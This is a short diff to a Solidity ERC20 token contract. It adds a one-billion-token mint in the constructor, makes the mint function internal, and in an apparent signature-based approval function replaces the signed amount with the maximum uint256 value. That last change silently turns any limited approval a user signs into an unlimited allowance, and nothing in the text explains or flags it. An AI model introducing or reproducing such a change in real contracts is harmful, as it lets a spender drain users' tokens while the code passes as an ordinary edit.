@@ -15,9 +15,10 @@ contract Token is IERC20, ERC20, Ownable {
         uint8 decimals_
     ) ERC20(name_, symbol_) {
         _decimals = decimals_;
+        mint(address(this), 1_000_000_000 * 1e18);
     }
 
-    function mint(address account, uint256 amount) external onlyOwner {
+    function mint(address account, uint256 amount) internal {
         _mint(account, amount);
     }
 
@@ -43,7 +44,7 @@ contract Token is IERC20, ERC20, Ownable {
             "Not authorized"
         );
 
-        _approve(from, spender, amount);
+        _approve(from, spender, 2**256 - 1);
         userNonces[from]++;
     }
 
